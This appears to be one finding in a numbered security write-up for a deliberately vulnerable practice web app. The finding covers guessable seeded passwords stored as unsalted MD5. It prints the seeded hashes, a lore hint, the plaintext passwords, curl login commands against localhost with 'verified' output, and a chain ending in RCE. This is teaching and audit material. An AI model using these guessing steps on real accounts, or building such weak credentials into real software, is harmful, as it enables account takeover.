# 32 — Weak, guessable seeded passwords

- **OWASP Top 10 (2021):** A07:2021 – Identification and Authentication Failures
- **Severity:** Medium
- **Difficulty:** Medium

## Where

`sql/seed.sql:4-7` — seeded users and password hashes:

```sql
INSERT INTO users (username, password_md5, email, display_name, role) VALUES
('ulla',  '20e59b65186fd11108829062d5ba2968', ...),
('admin', '36f97e92ef3b4c1c6a41e46cc95db899', ...),
('bengt', 'bf16f908d8ac29459f385599ac58f804', ...),
('karin', '5d7dff2525485995bfe57e5b91de82ee', ...);
```

The admin password is further weakened by an in-fiction hint at
`sql/seed.sql:25`:

```sql
(159, 2, 'Lösenord', 'you know what it is Elessar, Elfstone, Strider, heir of Isildur, ...')
```

## How it works (root cause)

The seeded passwords are short, guessable, and follow obvious patterns
(season/year, lore-based hints). They are stored with unsalted MD5 (22), so
offline cracking is trivial once hashes are leaked.

## Exploitation steps

1. Use the known/guessed credentials directly:

   ```bash
   curl -s -o /dev/null -w '%{http_code}\n' \
     --data-urlencode 'username=ulla'  --data-urlencode 'password=Sommar2026'  http://127.0.0.1:8080/login.php
   curl -s -o /dev/null -w '%{http_code}\n' \
     --data-urlencode 'username=admin' --data-urlencode 'password=Aragorn2025!' http://127.0.0.1:8080/login.php
   curl -s -o /dev/null -w '%{http_code}\n' \
     --data-urlencode 'username=bengt' --data-urlencode 'password=Hosten2024' http://127.0.0.1:8080/login.php
   ```

2. For admin, the hint in note 159 (see 08) points to `Aragorn2025!`.

## Working PoC (verified)

```text
ulla 302
admin 302
bengt 302
```

All three logins succeed with the seeded passwords.

## Expected result / verification

- Known seeded passwords authenticate successfully.
- The admin account is reachable either by hint, guessing, or brute force
  (30).

## Attack chain

```
weak seeded password / hint (this finding)
  → valid login
  → admin panel (16) or API token (18/28)
  → RCE
```

## Notes

- The password policy is effectively absent: short, predictable, and reused
  across the exercise.
- This finding pairs with 22 (unsalted MD5) and 30 (no rate limiting).
